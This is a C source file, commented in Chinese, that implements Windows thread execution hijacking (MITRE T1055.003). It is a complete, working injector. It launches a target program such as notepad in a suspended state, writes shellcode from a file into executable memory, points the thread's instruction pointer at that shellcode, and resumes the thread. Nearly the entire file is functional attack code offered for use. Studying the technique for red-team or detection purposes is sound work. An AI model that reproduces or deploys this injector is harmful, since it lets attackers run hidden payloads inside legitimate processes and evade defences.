/*
 * Thread Hijacking (Thread Execution Hijacking)
 *
 * 通过劫持线程上下文执行 shellcode
 *
 * 核心原理：
 * 1. 创建挂起的进程
 * 2. 分配内存并写入 shellcode
 * 3. 获取主线程的上下文（寄存器状态）
 * 4. 修改指令指针（RIP/EIP）指向 shellcode
 * 5. 设置新的线程上下文
 * 6. 恢复线程执行
 *
 * 与其他技术的区别：
 * - 不使用 CreateRemoteThread（不创建新线程）
 * - 劫持现有线程的执行流程
 * - 修改线程的指令指针寄存器
 *
 * MITRE ATT&CK: T1055.003
 */

#include <windows.h>
#include <stdio.h>

// ========================================
// 函数声明
// ========================================

BOOL InjectAndHijackThread(const char *targetPath, unsigned char *shellcode, size_t shellcode_size);

// ========================================
// 主函数
// ========================================

int main(int argc, char *argv[])
{
    printf("========================================\n");
    printf("  Thread Hijacking\n");
    printf("  线程执行劫持\n");
    printf("========================================\n\n");

    if (argc != 3) {
        printf("用法: %s <目标程序路径> <shellcode文件>\n", argv[0]);
        printf("示例: %s \"C:\\Windows\\System32\\notepad.exe\" payload.bin\n", argv[0]);
        return 1;
    }

    // 解析参数
    const char *targetPath = argv[1];
    const char *shellcode_path = argv[2];

    // 读取 shellcode
    FILE *fp = fopen(shellcode_path, "rb");
    if (!fp) {
        printf("[!] 无法打开 shellcode 文件: %s\n", shellcode_path);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char *)malloc(shellcode_size);
    if (!shellcode) {
        printf("[!] 内存分配失败\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    printf("[+] 已读取 shellcode: %lu 字节\n", (unsigned long)shellcode_size);
    printf("[*] 目标程序: %s\n\n", targetPath);

    // 执行线程劫持
    BOOL success = InjectAndHijackThread(targetPath, shellcode, shellcode_size);

    free(shellcode);

    if (success) {
        printf("\n[+] 线程劫持成功！\n");
        printf("[*] Shellcode 已在目标进程中执行\n");
        return 0;
    } else {
        printf("\n[!] 线程劫持失败\n");
        return 1;
    }
}

// ========================================
// 核心注入函数
// ========================================

BOOL InjectAndHijackThread(const char *targetPath, unsigned char *shellcode, size_t shellcode_size)
{
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    LPVOID remoteMemory = NULL;
    BOOL result = FALSE;

    si.cb = sizeof(si);

    // 1. 创建挂起的进程
    printf("[*] 步骤 1: 创建挂起的进程...\n");
    if (!CreateProcessA(
            NULL,
            (LPSTR)targetPath,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[!] CreateProcess 失败: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] 已创建挂起的进程\n");
    printf("  [+] 进程 ID: %lu\n", pi.dwProcessId);
    printf("  [+] 线程 ID: %lu\n", pi.dwThreadId);
    printf("  [+] 进程句柄: 0x%p\n", pi.hProcess);
    printf("  [+] 线程句柄: 0x%p\n", pi.hThread);

    // 2. 在目标进程分配内存
    printf("[*] 步骤 2: 分配远程内存...\n");
    remoteMemory = VirtualAllocEx(pi.hProcess, NULL, shellcode_size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        printf("[!] VirtualAllocEx 失败: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 已分配远程内存: 0x%p (大小: %lu 字节)\n", remoteMemory, (unsigned long)shellcode_size);

    // 3. 写入 shellcode
    printf("[*] 步骤 3: 写入 shellcode...\n");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, shellcode_size, &bytesWritten)) {
        printf("[!] WriteProcessMemory 失败: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 已写入 %lu 字节\n", (unsigned long)bytesWritten);

    // 4. 获取线程上下文
    printf("[*] 步骤 4: 获取线程上下文...\n");

#ifdef _WIN64
    // x64 版本
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] GetThreadContext 失败: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 已获取线程上下文 (x64)\n");
    printf("  [*] 原始 RIP: 0x%llX\n", ctx.Rip);

    // 5. 修改指令指针指向 shellcode
    printf("[*] 步骤 5: 修改指令指针...\n");
    ctx.Rip = (DWORD64)remoteMemory;
    printf("  [+] 新 RIP: 0x%llX\n", ctx.Rip);

#else
    // x86 版本
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[!] GetThreadContext 失败: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 已获取线程上下文 (x86)\n");
    printf("  [*] 原始 EIP: 0x%lX\n", ctx.Eip);

    // 5. 修改指令指针指向 shellcode
    printf("[*] 步骤 5: 修改指令指针...\n");
    ctx.Eip = (DWORD)remoteMemory;
    printf("  [+] 新 EIP: 0x%lX\n", ctx.Eip);
#endif

    // 6. 设置新的线程上下文
    printf("[*] 步骤 6: 设置新的线程上下文...\n");
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[!] SetThreadContext 失败: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 已设置新的线程上下文\n");

    // 7. 恢复线程执行
    printf("[*] 步骤 7: 恢复线程执行...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[!] ResumeThread 失败: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    printf("[+] 线程已恢复，shellcode 正在执行...\n");

    // 等待一段时间让 shellcode 执行
    Sleep(2000);

    result = TRUE;

    // 清理句柄
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return result;
}
